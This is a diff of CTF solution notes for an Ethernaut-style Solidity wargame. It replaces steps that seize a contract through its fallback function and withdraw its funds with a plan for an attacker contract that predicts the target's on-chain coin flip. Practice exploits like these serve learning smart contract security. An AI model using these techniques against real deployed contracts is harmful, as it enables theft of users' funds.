@@ -2,23 +2,21 @@
 // 1. Guess coin flip correctly 10 times in a row
 // -------------------------------
 // STRATEGY:
-// 1. 
+// 1. Noticed "random" num is transparently generated - can be reliably predicted
+// 2. Create attacker Solidity contract that calculates
+//      the random number using same inputs, then calls
+//      the target flip() function with correct guess
+// 3. Call the attacker function 10 times to get counter to 10
 // -------------------------------------------- 
 // STEPS TO COMPLETE LEVEL
 // -----------------------
 
-// 1 - Contribute < 0.001 ether
-await contract.contribute({from: player, value: toWei("0.0009"), gas: 1000000})
+// 1 - Code the attacker Solidity contract in Remix
+// see predictFlip.sol
 
-// 2 - Call fallback function
-// data = some junk value (to call an unknown function)
-// value = some positive amount of ether
-// from = a sender who has contributed
-// to = the contract
-await sendTransaction({data: "0x999", from: player, to: instance, value: toWei("0.0001"), gas: 1000000})
+// 2 - Deploy attacker contract to Rinkeby via Remix
 
-// 3 - Check if I pwned the contract
-await contract.owner() // I did
+// 3 - Call predictFlip's flip() function 10 times via Remix
 
-// 4 - Call withdraw to steal funds
-await contract.withdraw({from: player, gas: 1000000})
+// 4 - Call consecutiveWins() in target contract to check predictions work
+await contract.consecutiveWins()
